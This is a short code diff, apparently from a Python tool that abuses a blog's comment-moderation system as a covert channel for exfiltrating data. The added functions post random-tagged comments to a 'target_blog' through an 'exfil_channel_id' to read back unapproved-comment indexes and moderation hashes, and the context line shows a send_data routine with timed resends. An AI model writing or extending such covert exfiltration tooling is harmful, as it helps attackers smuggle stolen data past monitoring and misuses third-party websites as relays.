@@ -168,3 +168,17 @@ def send_data(channel, data, send_time_slot, confirm_time_slot):
                 break
             else:
                 print("[INFO] Message was not received by server. Resending...")
+
+
+def get_current_unapproved_index(channel):
+    random_string = generate_random_string(10)
+    comment_to_send = random_string + ": get_current_unapproved_index"
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment_to_send)
+
+    return response.unapproved_index
+
+def get_moderation_hash_at_current_time(channel):
+    random_string = generate_random_string(10)
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, random_string + ": Getting_moderation_hash")
+
+    return response.moderation_hash, response.unapproved_index
